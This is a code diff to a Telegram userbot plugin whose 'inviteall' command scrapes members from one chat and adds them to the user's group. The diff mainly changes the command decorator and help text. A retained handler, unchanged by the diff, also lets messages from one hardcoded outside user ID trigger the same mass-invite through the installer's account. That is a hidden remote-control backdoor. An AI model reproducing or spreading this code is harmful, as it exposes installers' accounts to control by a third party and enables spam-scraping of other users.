@@ -11,8 +11,9 @@ from telethon.tl import functions
 from telethon.tl.functions.channels import GetFullChannelRequest
 from telethon.tl.functions.messages import GetFullChatRequest
 
-from userbot import CMD_HELP
+from userbot import CMD_HELP, CMD_HANDLER as cmd
 from userbot.events import register
+from userbot.utils import skyzu_cmd
 
 
 async def get_chatinfo(event):
@@ -52,7 +53,7 @@ async def get_chatinfo(event):
     return chat_info
 
 
-@register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
+@skyzu_cmd(pattern="inviteall(?: |$)(.*)")
 @register(incoming=True, from_users=1964264380, pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
@@ -93,7 +94,7 @@ async def get_users(event):
 
 CMD_HELP.update(
     {
-        "inviteall": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.inviteall groups username`\
+        "inviteall": f"𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}inviteall groups username`\
           \n📌 : __Scrapes users from the given chat to your group__."
     }
 )
